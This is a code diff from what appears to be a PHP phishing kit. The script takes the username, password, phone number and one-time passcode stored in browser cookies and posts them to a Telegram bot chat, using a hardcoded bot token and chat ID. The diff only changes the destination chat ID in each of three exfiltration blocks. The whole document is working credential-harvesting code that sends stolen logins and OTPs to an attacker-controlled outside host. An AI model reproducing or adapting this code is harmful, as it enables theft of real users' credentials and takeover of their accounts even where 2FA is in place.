@@ -89,22 +89,23 @@ else {
 
 if (isset($_COOKIE['username']) && isset($_COOKIE['password'])) {
 $a = [
-'chat_id' => "-689765010",
+'chat_id' => "-773692150",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password']
 ];
 file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
 }
 if (!empty($_COOKIE['number'])) {
         $a = [
-'chat_id' => "-689765010",
+'chat_id' => "-773692150",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number']
 ];
 file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
 }
 if (!empty($_COOKIE['otp'])) {
         $a = [
-'chat_id' => "-689765010",
+'chat_id' => "-773692150",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nOTP: " . $_COOKIE['otp']
 ];
 file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
 }
+
